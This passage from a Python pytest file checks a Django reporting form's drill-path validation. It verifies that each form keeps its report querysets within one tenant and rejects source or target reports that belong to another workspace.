    report = _operationalreporting_create_report(tenant_a, admin_user)
    valid_targets = ["subreport", "operational_report", "erp_record_url"]
    for t_type in valid_targets:
        payload = _operationalreporting_base_drill_path_data(
            report.pk, target_type=t_type
        )
        form = ReportDrillPathForm(data=payload, tenant=tenant_a)
        assert form.is_valid(), f"Failed for target_type: {t_type}"

    # Invalid target
    payload_bad = _operationalreporting_base_drill_path_data(
        report.pk, target_type="unsupported_quantum_link"
    )
    form_bad = ReportDrillPathForm(data=payload_bad, tenant=tenant_a)
    assert not form_bad.is_valid()
    assert "target_type" in form_bad.errors


@pytest.mark.django_db
def test_operationalreporting_drill_path_form_tenant_queryset_scoping(
    tenant_a, tenant_b, admin_user, admin_user_b
):
    """Verify that form __init__ scopes source_report and target_report querysets to tenant."""
    report_a = _operationalreporting_create_report(tenant_a, admin_user, name="Report A Source")
    report_b = _operationalreporting_create_report(tenant_b, admin_user_b, name="Report B Source")

    form = ReportDrillPathForm(tenant=tenant_a)
    source_qs = list(form.fields["source_report"].queryset)
    target_qs = list(form.fields["target_report"].queryset)

    assert report_a in source_qs
    assert report_b not in source_qs

    assert report_a in target_qs
    assert report_b not in target_qs


@pytest.mark.django_db
def test_operationalreporting_drill_path_form_reject_foreign_source_report(
    tenant_a, tenant_b, admin_user_b
):
    """Verify reject_foreign defense blocks foreign source_report."""
    report_b = _operationalreporting_create_report(tenant_b, admin_user_b, name="Foreign Source Report")
    payload = _operationalreporting_base_drill_path_data(report_b.pk)
    form = ReportDrillPathForm(data=payload, tenant=tenant_a)
    form.fields["source_report"].queryset = ReportDefinition.objects.all()
    assert not form.is_valid()
    assert "source_report" in form.errors
    assert "That record belongs to another workspace." in form.errors["source_report"]


@pytest.mark.django_db
def test_operationalreporting_drill_path_form_reject_foreign_target_report(
    tenant_a, tenant_b, admin_user, admin_user_b
):
    """Verify reject_foreign defense blocks foreign target_report."""
    report_a = _operationalreporting_create_report(tenant_a, admin_user, name="Acme Source Report")
    report_b = _operationalreporting_create_report(tenant_b, admin_user_b, name="Globex Target Report")
    payload = _operationalreporting_base_drill_path_data(
        report_a.pk,
        target_report=report_b.pk,
    )
    form = ReportDrillPathForm(data=payload, tenant=tenant_a)
    form.fields["target_report"].queryset = ReportDefinition.objects.all()
    assert not form.is_valid()
    assert "target_report" in form.errors
    assert "That record belongs to another workspace." in form.errors["target_report"]


def test_operationalreporting_drill_path_form_meta_field_exclusions():
    """Verify tenant, number, created_at, and updated_at are excluded from drill path Meta."""
    fields = ReportDrillPathForm.Meta.fields
    assert "tenant" not in fields
    assert "number" not in fields
    assert "created_at" not in fields
    assert "updated_at" not in fields
